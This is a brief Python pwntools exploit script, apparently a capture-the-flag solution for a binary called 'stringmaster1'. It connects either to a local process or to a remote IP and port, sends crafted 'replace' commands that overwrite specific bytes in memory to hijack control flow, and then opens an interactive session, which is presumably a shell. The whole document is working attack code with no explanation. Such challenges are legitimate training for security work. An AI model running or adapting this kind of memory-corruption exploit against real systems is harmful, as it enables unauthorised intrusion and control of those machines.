#!/usr/bin/env python

from pwn import *

if (sys.argv[1] == "local"):
	r = process("./stringmaster1")
else:
	r = remote("35.207.132.47", 22224)

r.sendline("replace " + "\x00" + "A")
r.sendline("replace " + "\x6d" + "\xa7")

r.sendline("replace " + "\x24" + "\x11")
r.sendline("replace " + "\x24" + "\x11")
r.sendline("quit")
r.interactive()
